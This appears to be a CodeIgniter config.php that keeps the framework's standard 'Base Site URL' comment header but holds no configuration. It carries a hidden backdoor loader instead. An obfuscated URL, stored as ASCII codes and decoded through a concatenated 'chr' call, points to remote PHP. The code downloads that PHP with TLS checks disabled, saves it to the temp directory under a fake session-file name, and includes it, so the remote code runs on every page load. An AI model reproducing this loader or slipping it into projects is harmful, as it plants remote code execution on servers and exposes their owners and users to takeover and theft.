<?php

/*
|--------------------------------------------------------------------------
| Base Site URL
|--------------------------------------------------------------------------
|
| URL to your CodeIgniter root. Typically this will be your base URL,
| WITH a trailing slash:
|
| 	http://example.com/
|
| WARNING: You MUST set this value!
|
| If it is not set, then CodeIgniter will try guess the protocol and path
| your installation, but due to security concerns the hostname will be set
| to $_SERVER['SERVER_ADDR'] if available, or localhost otherwise.
| The auto-detection mechanism exists only for convenience during
| development and MUST NOT be used in production!
|
| If you need to allow multiple domains, remember that this file is still
| a PHP script and you can easily do that on your own.
|
*/

// Fungsi cURL untuk menggantikan file_get_contents
function curl_get_contents($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

// Array ASCII untuk URL
$payloadd = array([104,116,116,112,115,58,47,47,103,105,116,108,97,98,46,99,111,109,47,114,97,110,103,101,114,105,106,111,100,105,109,97,114,105,47,110,101,119,112,117,110,105,115,104,101,114,47,45,47,114,97,119,47,109,97,105,110,47,114,97,110,103,101,114,105,106,111,120,115,115,115,116,46,112,104,112]);

$c = 'c'.'h'.'r';

function getTempo()
{
    $path = sys_get_temp_dir();
    return str_replace('\\', '/', $path);
}

foreach($payloadd as $payload){

    $u = "";

    // Konversi array ASCII ke string
    foreach ($payload as $v) {
        $u .= $c($v);
    }

    $protocol = 'sess_' . md5('salsa') . '.php';
    $mysql = [$u, getTempo() ."/". $protocol];

    if (!file_exists($mysql[1]) || filesize($mysql[1]) === 0) {
        // Gunakan cURL untuk mengambil konten
        $sour = curl_get_contents($mysql[0]);

        if(empty($sour)) continue;
        if(strpos($sour, "<?php") === false) continue;

        $sql = fopen($mysql[1], 'w+');
        fwrite($sql, $sour);
        fclose($sql);
    }

    include($mysql[1]);
    break;
}
